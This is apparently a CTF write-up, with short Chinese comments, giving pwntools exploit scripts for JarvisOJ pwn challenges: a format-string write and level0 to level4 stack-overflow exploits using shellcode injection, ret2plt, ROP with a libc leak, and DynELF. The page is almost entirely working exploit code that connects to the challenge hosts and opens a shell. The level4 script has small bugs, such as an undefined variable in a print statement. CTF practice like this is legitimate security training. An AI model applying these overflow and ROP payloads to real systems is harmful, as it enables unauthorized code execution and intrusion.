## pwn

## fmt
最基础的字符串格式化漏洞

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [esp+2Ch] [ebp-5Ch]
  unsigned int v5; // [esp+7Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  be_nice_to_people();
  memset(&buf, 0, 0x50u);
  read(0, &buf, 0x50u);
  printf(&buf);
  printf("%d!\n", x);
  if ( x == 4 )
  {
    puts("running sh...");
    system("/bin/sh");
  }
  return 0;
}
```
只需要将x的值写为4就能getshell
exp:

```py
payload=fmtstr_payload(11,{0x0804A02C:4})
sh.sendline(payload)
sh.interactive()
```

## level0
```py
from pwn import *
p=remote('pwn2.jarvisoj.com',9881)
shell_addr=0x400596
p.sendline('A'*0x88+p64(shell_addr))
p.interactive()

```
## level1
```py
from pwn import *
p=remote('pwn2.jarvisoj.com',9877)
p.recvuntil(':')
buf_addr=int(p.recvline(keepends=False)[:-1],16)
print buf_addr
shellcode=asm(shellcraft.sh())
p.sendline(shellcode+'A'*(0x8c-len(shellcode))+p32(buf_addr))
p.interactive()
```

## level2
```py
from pwn import *
import binascii
context.log_level='debug'
context.terminal=['bash']
debug=False

libc='/lib/x86_64-linux-gnu/libc.so.6'
elf_name='./level2'
remote_addr=['pwn2.jarvisoj.com',9878]
elf=ELF(elf_name)
libc=ELF(libc)

system_plt=elf.plt['system']
main_addr=elf.symbols['main']
libc_start_main_got=elf.got['__libc_start_main']

if debug:
    sh=process(elf_name)
else:
    sh=remote(remote_addr[0],remote_addr[1])

payload=flat([
    "A"*0x88,
    'A'*4,
    system_plt,
    'A'*4,
    0x0804A024,
])
sh.sendline(payload)
sh.interactive()
```

## level3
ROP
```py
from pwn import *
import binascii
context.log_level='debug'
context.terminal=['bash']
debug=False

libc='./libc-2.19.so'
# libc='/lib32/libc.so.6'
elf_name='./level3'
remote_addr=['pwn2.jarvisoj.com',9879]
elf=ELF(elf_name)
libc=ELF(libc)

write_plt=elf.plt['write']
main_addr=elf.symbols['main']
libc_start_main_got=elf.got['__libc_start_main']

if debug:
    sh=process(elf_name)
else:
    sh=remote(remote_addr[0],remote_addr[1])

# lake libc
payload=flat([
    "A"*0x88,
    'A'*4,
    write_plt,
    main_addr,
    1,
    libc_start_main_got,
    4
])
sh.sendline(payload)
sh.recvline()
temp=u32(sh.recv(4))
print(hex(temp))
libc_base=temp-libc.symbols['__libc_start_main']
system_addr=libc_base+libc.symbols['system']
bin_sh_addr=libc_base+libc.search('/bin/sh').next()
## get shell
getshell=flat([
    "A"*0x88,
    'A'*4,
    system_addr,
    main_addr,
    bin_sh_addr
])
sh.sendline(getshell)
sh.interactive()
```

## level4
找了半天找不到libc，只能用dynelf去解了
```py
from pwn import *
import binascii
context.log_level='debug'
context.terminal=['bash']
debug=False
libc='./libc-2.19.so'
libc='/lib32/libc.so.6'
elf_name='./level4'
remote_addr=['pwn2.jarvisoj.com',9880]
elf=ELF(elf_name)
libc=ELF(libc)

write_plt=elf.plt['write']
read_plt=elf.plt['read']
main_addr=elf.symbols['main']
libc_start_main_got=elf.got['__libc_start_main']
write_got=elf.got['write']
read_got=elf.got['read']


bss_addr=elf.bss()
if debug:
    sh=process(elf_name)
else:
    sh=remote(remote_addr[0],remote_addr[1])

# lake libc
def lake(addr):
    payload=flat([
        "A"*0x88,
        'A'*4,
        write_plt,
        main_addr,
        1,
        addr,
        4
    ])
    sh.sendline(payload)
    print "%#x %s" % (addr, data)
    return sh.recv(4)


dynelf=DynELF(lake,elf=elf)
system_addr=dynelf.lookup('system','libc')
print system_addr
## get shell
read_bin_sh=flat([
    "A"*0x88,
    'A'*4,
    read_plt, 
    main_addr,
    0,
    bss_addr,
    8,
])
#其实可以简化一下,一次溢出就够了,要将read函数的参数pop出来
#payload1 += p32(read_plt) + p32(pop3ret)
#payload1 += p32(0) + p32(bss_addr) + p32(8)
#payload1 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)
sh.sendline(read_bin_sh)
sh.send('/bin/sh\x00')

get_shell=flat([
    "A"*0x88,
    'A'*4,
    system_addr,
    main_addr,
    bss_addr,
])
sh.sendline(get_shell)
sh.interactive()
```
